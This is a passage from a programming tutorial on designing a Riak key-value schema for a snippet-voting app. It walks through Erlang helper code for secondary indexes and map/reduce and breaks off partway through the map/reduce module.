<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>riak/dev <span class="nv">$ </span>dev1/bin/riak stop
</span><span class='line'>ok
</span><span class='line'>riak/dev <span class="nv">$ </span>dev2/bin/riak stop
</span><span class='line'>ok
</span><span class='line'>riak/dev <span class="nv">$ </span>dev3/bin/riak stop
</span><span class='line'>ok
</span></code></pre></td></tr></table></div></figure>


<p>To modify all the <code>app.config</code> files easily we can run one simple command from the <code>dev</code> (the parent folder which contains all the dev Riak instances):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>riak/dev <span class="nv">$ </span>vim ./**/app.config
</span></code></pre></td></tr></table></div></figure>


<p>This will open <a href="http://www.vim.org/" title="VIM">VIM</a> with all of the <code>app.config</code> files open so that we can easily made the necessary modifications. In each of these files, find the <code>riak_kv</code> configuration section and change the backend like so:</p>

<figure class='code'><figcaption><span>apps/csd_core/rebar.config (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="p">...</span> <span class="n">snip</span> <span class="p">...</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% Riak KV config</span>
</span><span class='line'><span class="p">{</span><span class="n">riak_kv</span><span class="p">,</span> <span class="p">[</span>
</span><span class='line'>          <span class="c">%% Storage_backend specifies the Erlang module defining the storage</span>
</span><span class='line'>          <span class="c">%% mechanism that will be used on this node.</span>
</span><span class='line'>          <span class="p">{</span><span class="n">storage_backend</span><span class="p">,</span> <span class="n">riak_kv_eleveldb_backend</span><span class="p">},</span>
</span><span class='line'>          <span class="p">...</span> <span class="n">snip</span> <span class="p">...</span>
</span><span class='line'><span class="p">]}</span>
</span><span class='line'><span class="p">...</span> <span class="n">snip</span> <span class="p">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>Done. Don&rsquo;t forget to make sure your dev cluster is running again before you continue:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>riak/dev <span class="nv">$ </span>dev1/bin/riak start
</span><span class='line'>riak/dev <span class="nv">$ </span>dev2/bin/riak start
</span><span class='line'>riak/dev <span class="nv">$ </span>dev3/bin/riak start
</span></code></pre></td></tr></table></div></figure>


<h2><a id="schema-design"></a>Schema Design</h2>

<p>Before we get going with any more of the implementation, we need to consider the design of the &ldquo;schema&rdquo; we&rsquo;re going to use when storing our data in Riak. We want our users to be able to:</p>

<ol>
<li>Submit snippets to the system.</li>
<li>See a list of snippets they have submitted to the system (and down the track see other lists using filters).</li>
<li>Vote for the left- or right- hand snippets to indicate which they prefer.</li>
<li>See that they have voted for a snippet before and be reminded of which one they voted for.</li>
</ol>


<p>At the centre of this data there is the <em>snippet</em>. The snippet has the following fields:</p>

<ul>
<li><code>title</code>: A simple descriptive label.</li>
<li><code>left</code>: One way of performing a function in a given language.</li>
<li><code>right</code>: Another way of performing the same function in a given language (which may not be the same as the language used for <code>left</code>).</li>
<li><code>created</code>: A date/time when the snippet was created/submitted.</li>
<li><code>key</code>: A key/ID which identifies the snippet.</li>
</ul>


<p>These fields will be stored as a blob of JSON.</p>

<p>We also need to store with the snippet an identifier for the user that submitted it. Rather than storing this with the payload, we are instead going to create a secondary index which contains this information. We can then use this index to query the store to find out the snippets a user has submitted. This index will be called <code>userid</code>.</p>

<p>In future posts we will probably include more indexes and/or fields, but for the functionality we&rsquo;re aiming to build for this post these fields are sufficient.</p>

<p>Next we need to store votes. In a typical RDMBS this problem is well-known and the solutions out there are also well-known. In a KV store this isn&rsquo;t necessarily the case. What I propose in this post is <em>a possible way</em> of solving this problem. I do not in any way claim that this is <em>the best way</em>. With this, this is what we&rsquo;re going to do&hellip;</p>

<p>A <code>vote</code> needs to keep track of who submitted it along with the snippet it was put against. It also needs to have an indication of whether the user preferred the left or right hand side of the snippet. When these votes are stored, we also want to be able to query them in such a way so that, for a given snippet, we can quickly count the number of votes and which way those votes went. This is quite important as the tallying of the votes and displaying them on screen is a key part of the idea behind the application.</p>

<p>To identify a vote the key needs to be made up of both the <code>userid</code> of the person who submitted it and the <code>key</code> of the snippet the vote. Therefore, for the <code>vote</code> bucket we&rsquo;ll create keys in the format: <em>userid-snippetkey</em></p>

<p>While this makes sense, it doesn&rsquo;t make it easy for us to figure out which votes went against which snippets. To do this, we&rsquo;ll create a secondary index on the vote which contains the snippet key. This will give us a faster way of finding votes that relate to a key while still keeping the votes separate in the bucket. We can then do a map/reduce over the index and pull out the votes.</p>

<p>Originally I had pondered the idea of having another secondary index which contained the vote direction (<code>left</code> or <code>right</code>) and doing multiple map/reduces over the data to count the items. This seemed silly to me. I didn&rsquo;t think it made sense to invoke two map/reduce jobs when I could do the same thing with one. As a result, I decided to put the direction of the vote inside the vote payload itself as this can be used during a single map/reduce job to total both <code>left</code> and <code>right</code> votes. Down the track the user is going to want to be able to look at what they&rsquo;ve voted on (as part of a history timeline), so we&rsquo;ll also add a <code>userid</code> index.</p>

<p>Finally, we are going to need to store some more meaningful information about a user for future use, so we&rsquo;ll create a <code>user</code> bucket and store some metadata for each user with their Twitter ID as the key.</p>

<p>Here&rsquo;s a visual of what we should end up with:</p>

<p><img src="http://buffered.io/uploads/2012/07/part5-db-schema.png" title="'CSD Schema'" ></p>

<p>Now that we have the basics of the schema out of the way, the first thing we should do is adjust our Riak module to include the new features we&rsquo;ll need to do with secondary indexing and map/reduce.</p>

<h2><a id="handling-2i"></a>Handling 2i in csd_riak</h2>

<p>In Riak secondary indexes (2i) are stored as extra metadata alongside the Riak object. Two types of indexes are currently support: <code>integer</code> and <code>binary</code>. These index types are indicated using a naming convention, such that <code>integer</code> indexes are suffixed with <code>_int</code> and <code>binary</code> indexes are suffixed with <code>_bin</code>. Secondary indexes are stored as a key/value pair tuple inside the <code>index</code> section of the meta data.</p>

<p>So to start with let&rsquo;s define a few index-specific macros and helper functions.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_riak.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">INDEX_KEY</span><span class="p">,</span> <span class="o">&lt;&lt;</span><span class="s">&quot;index&quot;</span><span class="o">&gt;&gt;</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">INDEX_SUFFIX_INT</span><span class="p">,</span> <span class="o">&lt;&lt;</span><span class="s">&quot;_int&quot;</span><span class="o">&gt;&gt;</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">INDEX_SUFFIX_BIN</span><span class="p">,</span> <span class="o">&lt;&lt;</span><span class="s">&quot;_bin&quot;</span><span class="o">&gt;&gt;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">index</span><span class="p">(</span><span class="n">int</span><span class="p">,</span> <span class="nv">Name</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nb">iolist_to_binary</span><span class="p">([</span><span class="nv">Name</span><span class="p">,</span> <span class="no">?INDEX_SUFFIX_INT</span><span class="p">]);</span>
</span><span class='line'><span class="nf">index</span><span class="p">(</span><span class="n">bin</span><span class="p">,</span> <span class="nv">Name</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nb">iolist_to_binary</span><span class="p">([</span><span class="nv">Name</span><span class="p">,</span> <span class="no">?INDEX_SUFFIX_BIN</span><span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here the <code>index</code> function is a simple function which allows us to generate an index name based on a type and a name. This can be called like so: <code>IndexName = index(int, "userid").</code> &ndash; We&rsquo;ll make use of this in other areas, including the <code>csd_riak_mr</code> module which we&rsquo;ll cover off shortly.</p>

<p>Next we&rsquo;ll define some functions which make it easier to add indexes to Riak objects.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_riak.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">set_index</span><span class="p">(</span><span class="nv">RiakObj</span><span class="p">,</span> <span class="nv">Type</span><span class="p">,</span> <span class="nv">Name</span><span class="p">,</span> <span class="nv">Value</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Meta</span> <span class="o">=</span> <span class="nn">riakc_obj</span><span class="p">:</span><span class="n">get_update_metadata</span><span class="p">(</span><span class="nv">RiakObj</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Index</span> <span class="o">=</span> <span class="k">case</span> <span class="nn">dict</span><span class="p">:</span><span class="n">find</span><span class="p">(</span><span class="no">?INDEX_KEY</span><span class="p">,</span> <span class="nv">Meta</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="n">error</span> <span class="o">-&gt;</span> <span class="p">[];</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">I</span><span class="p">}</span> <span class="o">-&gt;</span> <span class="nv">I</span>
</span><span class='line'>  <span class="k">end</span><span class="p">,</span>
</span><span class='line'>  <span class="nv">NewIndex</span> <span class="o">=</span> <span class="nn">dict</span><span class="p">:</span><span class="n">to_list</span><span class="p">(</span><span class="nn">dict</span><span class="p">:</span><span class="n">store</span><span class="p">(</span><span class="n">index</span><span class="p">(</span><span class="nv">Type</span><span class="p">,</span> <span class="nv">Name</span><span class="p">),</span> <span class="n">value</span><span class="p">(</span><span class="nv">Value</span><span class="p">),</span> <span class="nn">dict</span><span class="p">:</span><span class="n">from_list</span><span class="p">(</span><span class="nv">Index</span><span class="p">))),</span>
</span><span class='line'>  <span class="nn">riakc_obj</span><span class="p">:</span><span class="n">update_metadata</span><span class="p">(</span><span class="nv">RiakObj</span><span class="p">,</span> <span class="nn">dict</span><span class="p">:</span><span class="n">store</span><span class="p">(</span><span class="no">?INDEX_KEY</span><span class="p">,</span> <span class="nv">NewIndex</span><span class="p">,</span> <span class="nv">Meta</span><span class="p">)).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">set_indexes</span><span class="p">(</span><span class="nv">RiakObj</span><span class="p">,</span> <span class="nv">Indexes</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Meta</span> <span class="o">=</span> <span class="nn">riakc_obj</span><span class="p">:</span><span class="n">get_update_metadata</span><span class="p">(</span><span class="nv">RiakObj</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Index</span> <span class="o">=</span> <span class="k">case</span> <span class="nn">dict</span><span class="p">:</span><span class="n">find</span><span class="p">(</span><span class="no">?INDEX_KEY</span><span class="p">,</span> <span class="nv">Meta</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="n">error</span> <span class="o">-&gt;</span> <span class="p">[];</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">I</span><span class="p">}</span> <span class="o">-&gt;</span> <span class="nv">I</span>
</span><span class='line'>  <span class="k">end</span><span class="p">,</span>
</span><span class='line'>  <span class="nv">UpdatedIndexes</span> <span class="o">=</span> <span class="nn">lists</span><span class="p">:</span><span class="n">foldl</span><span class="p">(</span><span class="k">fun</span><span class="p">({</span><span class="nv">T</span><span class="p">,</span> <span class="nv">N</span><span class="p">,</span> <span class="nv">V</span><span class="p">},</span> <span class="nv">I</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>        <span class="nn">dict</span><span class="p">:</span><span class="n">store</span><span class="p">(</span><span class="n">index</span><span class="p">(</span><span class="nv">T</span><span class="p">,</span> <span class="nv">N</span><span class="p">),</span> <span class="n">value</span><span class="p">(</span><span class="nv">V</span><span class="p">),</span> <span class="nv">I</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span><span class="p">,</span>
</span><span class='line'>    <span class="nn">dict</span><span class="p">:</span><span class="n">from_list</span><span class="p">(</span><span class="nv">Index</span><span class="p">),</span> <span class="nv">Indexes</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">NewIndex</span> <span class="o">=</span> <span class="nn">dict</span><span class="p">:</span><span class="n">to_list</span><span class="p">(</span><span class="nv">UpdatedIndexes</span><span class="p">),</span>
</span><span class='line'>  <span class="nn">riakc_obj</span><span class="p">:</span><span class="n">update_metadata</span><span class="p">(</span><span class="nv">RiakObj</span><span class="p">,</span> <span class="nn">dict</span><span class="p">:</span><span class="n">store</span><span class="p">(</span><span class="no">?INDEX_KEY</span><span class="p">,</span> <span class="nv">NewIndex</span><span class="p">,</span> <span class="nv">Meta</span><span class="p">)).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_index</span><span class="p">(</span><span class="nv">RiakObj</span><span class="p">,</span> <span class="nv">Type</span><span class="p">,</span> <span class="nv">Name</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Meta</span> <span class="o">=</span> <span class="nn">riakc_obj</span><span class="p">:</span><span class="n">get_metadata</span><span class="p">(</span><span class="nv">RiakObj</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Indexes</span> <span class="o">=</span> <span class="nn">dict</span><span class="p">:</span><span class="n">fetch</span><span class="p">(</span><span class="no">?INDEX_KEY</span><span class="p">,</span> <span class="nv">Meta</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">IndexKey</span> <span class="o">=</span> <span class="n">index</span><span class="p">(</span><span class="nv">Type</span><span class="p">,</span> <span class="nv">Name</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Value</span> <span class="o">=</span> <span class="nb">binary_to_list</span><span class="p">(</span><span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="nv">IndexKey</span><span class="p">,</span> <span class="nv">Indexes</span><span class="p">)),</span>
</span><span class='line'>  <span class="k">case</span> <span class="nv">Type</span> <span class="k">of</span>
</span><span class='line'>    <span class="n">int</span> <span class="o">-&gt;</span> <span class="nb">list_to_integer</span><span class="p">(</span><span class="nv">Value</span><span class="p">);</span>
</span><span class='line'>    <span class="n">bin</span> <span class="o">-&gt;</span> <span class="nv">Value</span>
</span><span class='line'>  <span class="k">end</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first function, <code>set_index</code>, is used to update a Riak object instance and include a single new index of a certain type. This function gets existing <em>update metadata</em> (different to &ldquo;normal&rdquo; metatdata in that this is what will be used to update the object when saved) and then attemps to retrieve the <code>index</code> section of that data. If found adds the new index value to the list of indexes. If it&rsquo;s not found then the new indexes is simply inserted into an empty list. This information is then written into a new Riak object via the <code>riakc:update_metadata/2</code> function.</p>

<p>This code can be called like so: <code>NewObj = csd_riak:set_index(RiakObj, int, "userid", 12345).</code></p>

<p>This code converts between lists and dictionaries because I want existing index values to be overwritten with the new values.</p>

<p>The second function, <code>set_indexes</code>, is an extended version of <code>set_index</code> in that it allows you to set more than one key at a time. Instead of a single type/name/value combination it accepts a list of tuples of <code>{type, name, value}</code>.</p>

<p>The third function, <code>get_index</code>, is a helper function which is designed to get the value of certain index. Note how this function accesses <em>existing</em> metadata via <code>get_metadata/1</code> rather than <code>get_update_metadata/1</code>. This is due to us being interested in an existing index, not in one that is about to be updated when we next save. While we&rsquo;re here, we do a converstion of the value to an integer if the index type is an integer.</p>

<p>This code can be called like so: <code>UserId = csd_riak:get_index(RiakObj, int, "userid").</code></p>

<p>Last of all you may have noticed that a couple of these functions are calling another function called <code>value/1</code>. It looks like this:</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_riak.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% ------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% Private Function Definitions</span>
</span><span class='line'><span class="c">%% ------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="nf">value</span><span class="p">(</span><span class="nv">V</span><span class="p">)</span> <span class="k">when</span> <span class="nb">is_list</span><span class="p">(</span><span class="nv">V</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nb">list_to_binary</span><span class="p">(</span><span class="nv">V</span><span class="p">);</span>
</span><span class='line'><span class="nf">value</span><span class="p">(</span><span class="nv">V</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">V</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>As you can see this is an internal function which is there to help make sure that values are in the right format when being stored as an index.</p>

<p>With the 2i interface now taken care of, let&rsquo;s take a look at what we need to do for map/reduce.</p>

<h2><a id="supporting-mapreduce"></a>Supporting Map/Reduce in csd_riak</h2>

<p>As you&rsquo;re already aware, Riak&rsquo;s map/reduce interface requires a set of <em>inputs</em>, one or more <em>map</em> phases and zero or more <em>reduce</em> phases. We could manually construct each of these components each time we want to execute a map/reduce job but that doesn&rsquo;t quite feel right to me. Instead, I prefer to have a &ldquo;usable&rdquo; module that helps construct properly-formed map/reduce jobs to reduce the risk of the caller doing the wrong thing. Callers of our modules shouldn&rsquo;t have to know about the format of Riak&rsquo;s map/reduce interface in order to use it. So we&rsquo;ll provide a helper module which wraps this up.</p>

<p>Before we look at the code, bear in mind that this module supports enough functionality to provide what is needed for the application so far. Down the track extra features will be added to support other ways of doing map/reduce, but for now they are beyond the scope of this version of the application.</p>

<p>With that, let&rsquo;s take a look at the code.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_riak_mr.erl </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="p">-</span><span class="ni">module</span><span class="p">(</span><span class="n">csd_riak_mr</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">author</span><span class="p">(</span><span class="n">&#39;OJ Reeves &lt;oj@buffered.io&gt;&#39;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% ------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% API Function Exports</span>
</span><span class='line'><span class="c">%% ------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span>
</span><span class='line'>    <span class="n">create</span><span class="o">/</span><span class="mi">0</span><span class="p">,</span>
</span><span class='line'>    <span class="n">run</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span>
</span><span class='line'>    <span class="n">add_input_index</span><span class="o">/</span><span class="mi">5</span><span class="p">,</span>
</span><span class='line'>    <span class="n">add_map_js</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span>
</span><span class='line'>    <span class="n">add_map_js</span><span class="o">/</span><span class="mi">3</span><span class="p">,</span>
</span><span class='line'>    <span class="n">add_map_js</span><span class="o">/</span><span class="mi">4</span><span class="p">,</span>
</span><span class='line'>    <span class="n">add_reduce_js</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span>
</span><span class='line'>    <span class="n">add_reduce_js</span><span class="o">/</span><span class="mi">3</span><span class="p">,</span>
</span><span class='line'>    <span class="n">add_reduce_js</span><span class="o">/</span><span class="mi">4</span><span class="p">,</span>
</span><span class='line'>    <span class="n">add_reduce_sort_js</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span>
</span><span class='line'>    <span class="n">add_reduce_sort_js</span><span class="o">/</span><span class="mi">3</span>
</span><span class='line'>  <span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% ------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% Private Record Definitions</span>
</span><span class='line'><span class="c">%% ------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">record</span><span class="p">(</span><span class="nl">mr</span><span class="p">,</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">in_ind</span> <span class="o">=</span> <span class="n">undefined</span><span class="p">,</span>
</span><span class='line'>    <span class="c">%% TODO: when the need arises add support for other inputs</span>
</span><span class='line'>    <span class="c">%% including {bucket, key} and {bucket, key, arg}.</span>
</span><span class='line'>    <span class="n">phases</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>  <span class="p">}).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% ------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% API Function Definitions</span>
</span><span class='line'><span class="c">%% ------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @doc Create a mew map/reduce job instance.</span>
</span><span class='line'><span class="nf">create</span><span class="p">()</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nl">#mr</span><span class="p">{}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">run</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nl">#mr</span><span class="p">{</span><span class="n">in_ind</span><span class="o">=</span><span class="nv">Input</span><span class="p">,</span> <span class="n">phases</span><span class="o">=</span><span class="nv">P</span><span class="p">})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="c">% phases are pushed in reverse, so reverse them before using them</span>
</span><span class='line'>  <span class="nv">Phases</span> <span class="o">=</span> <span class="nn">lists</span><span class="p">:</span><span class="n">reverse</span><span class="p">(</span><span class="nv">P</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Result</span> <span class="o">=</span> <span class="nn">riakc_pb_socket</span><span class="p">:</span><span class="n">mapred</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">Input</span><span class="p">,</span> <span class="nv">Phases</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Result</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @doc Creates a map/reduce Input phase for a secondary index input.</span>
</span><span class='line'><span class="nf">add_input_index</span><span class="p">(</span><span class="nv">MR</span><span class="o">=</span><span class="nl">#mr</span><span class="p">{},</span> <span class="nv">Bucket</span><span class="p">,</span> <span class="nv">Type</span><span class="p">,</span> <span class="nv">Index</span><span class="p">,</span> <span class="nv">Value</span><span class="p">)</span> <span class="k">when</span> <span class="nb">is_integer</span><span class="p">(</span><span class="nv">Value</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">add_input_index</span><span class="p">(</span><span class="nv">MR</span><span class="p">,</span> <span class="nv">Bucket</span><span class="p">,</span> <span class="nv">Type</span><span class="p">,</span> <span class="nv">Index</span><span class="p">,</span> <span class="nb">integer_to_list</span><span class="p">(</span><span class="nv">Value</span><span class="p">));</span>
</span><span class='line'><span class="nf">add_input_index</span><span class="p">(</span><span class="nv">MR</span><span class="o">=</span><span class="nl">#mr</span><span class="p">{},</span> <span class="nv">Bucket</span><span class="p">,</span> <span class="nv">Type</span><span class="p">,</span> <span class="nv">Index</span><span class="p">,</span> <span class="nv">Value</span><span class="p">)</span> <span class="k">when</span> <span class="nb">is_list</span><span class="p">(</span><span class="nv">Value</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">add_input_index</span><span class="p">(</span><span class="nv">MR</span><span class="p">,</span> <span class="nv">Bucket</span><span class="p">,</span> <span class="nv">Type</span><span class="p">,</span> <span class="nv">Index</span><span class="p">,</span> <span class="nb">list_to_binary</span><span class="p">(</span><span class="nv">Value</span><span class="p">));</span>
</span><span class='line'><span class="nf">add_input_index</span><span class="p">(</span><span class="nv">MR</span><span class="o">=</span><span class="nl">#mr</span><span class="p">{},</span> <span class="nv">Bucket</span><span class="p">,</span> <span class="nv">Type</span><span class="p">,</span> <span class="nv">Index</span><span class="p">,</span> <span class="nv">Value</span><span class="p">)</span> <span class="k">when</span> <span class="nb">is_binary</span><span class="p">(</span><span class="nv">Value</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">MR</span><span class="nl">#mr</span><span class="p">{</span>
</span><span class='line'>    <span class="n">in_ind</span> <span class="o">=</span> <span class="p">{</span><span class="n">index</span><span class="p">,</span> <span class="nv">Bucket</span><span class="p">,</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">index</span><span class="p">(</span><span class="nv">Type</span><span class="p">,</span> <span class="nv">Index</span><span class="p">),</span> <span class="nv">Value</span><span class="p">}</span>
